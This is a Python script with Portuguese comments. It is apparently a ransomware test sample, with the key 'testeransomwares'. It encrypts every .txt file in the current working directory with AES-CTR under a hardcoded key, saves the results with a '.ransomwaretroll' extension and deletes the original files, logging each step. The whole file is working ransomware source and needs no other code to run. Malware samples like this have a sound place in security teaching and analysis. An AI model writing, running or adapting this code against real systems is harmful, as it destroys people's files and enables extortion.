import os
import pyaes
import logging

# Configurar o log
log_file = "log_criptodiversos.txt"  # Alterado o nome do arquivo de log
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

# Início do processo
logging.info("Início do processo")
print("Início do processo")

# Obter o diretório onde o script está sendo executado
diretorio = os.getcwd()  # Obtém o diretório de execução atual
logging.info(f"Diretório encontrado: OK")
print(f"Diretório encontrado: OK")

# Verificação do diretório
if not os.path.exists(diretorio):
    logging.error(f"[ERRO] O diretório {diretorio} não existe.")
    print(f"[ERRO] O diretório {diretorio} não existe.")
else:
    try:
        # Listar os arquivos encontrados no diretório
        arquivos = os.listdir(diretorio)
    except Exception as e:
        logging.error(f"[ERRO] Falha ao listar arquivos no diretório: {e}")
        print(f"[ERRO] Falha ao listar arquivos no diretório: {e}")
        arquivos = []

    # Filtrar apenas arquivos .txt (excluindo aqueles que já são criptografados)
    arquivos_txt = [file for file in arquivos if file.endswith(".txt") and not file.endswith(".ransomwaretroll")]

    # Exibir apenas os arquivos .txt encontrados
    if arquivos_txt:
        logging.info(f"Arquivos .txt encontrados: {arquivos_txt}")
        print(f"Arquivos .txt encontrados: {arquivos_txt}")
    else:
        logging.info("Faltando arquivos .txt para criptografar.")
        print("Faltando arquivos .txt para criptografar.")

    # Foco na criptografia de cada arquivo .txt
    for file_name in arquivos_txt:
        logging.info(f"Iniciando criptografia do arquivo: {file_name}")
        print(f"Iniciando criptografia do arquivo: {file_name}")

        file_path = os.path.join(diretorio, file_name)

        try:
            # Verifique se o arquivo existe antes de abrir
            if not os.path.isfile(file_path):
                logging.error(f"[ERRO] O arquivo {file_name} não foi encontrado.")
                print(f"[ERRO] O arquivo {file_name} não foi encontrado.")
                continue  # Pular para o próximo arquivo
            
            # Ler o arquivo em blocos (chunks)
            logging.info(f"Lendo arquivo: {file_name}")
            print(f"Lendo arquivo: {file_name}")
            with open(file_path, "rb") as file:
                file_data = file.read()

            logging.info(f"Arquivo {file_name} lido com sucesso!")
            print(f"Arquivo {file_name} lido com sucesso!")

            # Criptografar o arquivo
            logging.info(f"Criptografando o arquivo: {file_name}")
            print(f"Criptografando o arquivo: {file_name}")
            aes = pyaes.AESModeOfOperationCTR(b"testeransomwares")
            crypto_data = aes.encrypt(file_data)

            logging.info(f"Arquivo {file_name} criptografado com sucesso!")
            print(f"Arquivo {file_name} criptografado com sucesso!")

            # Criar o nome do arquivo criptografado (com sufixo fixo)
            new_file_name = file_name.split(".txt")[0] + ".txt.ransomwaretroll"
            new_file_path = os.path.join(diretorio, new_file_name)

            # Salvar o arquivo criptografado
            logging.info(f"Salvando arquivo criptografado como: {new_file_name}")
            print(f"Salvando arquivo criptografado como: {new_file_name}")
            with open(new_file_path, "wb") as new_file:
                new_file.write(crypto_data)

            logging.info(f"Arquivo {file_name} criptografado e salvo como {new_file_name}")
            print(f"Arquivo {file_name} criptografado e salvo como {new_file_name}")

            # Remover o arquivo original após criptografia
            logging.info(f"Removendo arquivo original: {file_name}")
            print(f"Removendo arquivo original: {file_name}")
            os.remove(file_path)

            logging.info(f"Arquivo {file_name} removido com sucesso.")
            print(f"Arquivo {file_name} removido com sucesso.")

        except Exception as e:
            logging.error(f"[ERRO] Falha ao processar o arquivo {file_name}: {e}")
            print(f"[ERRO] Falha ao processar o arquivo {file_name}: {e}")

logging.info("Processamento concluído.")
print("Processamento concluído.")
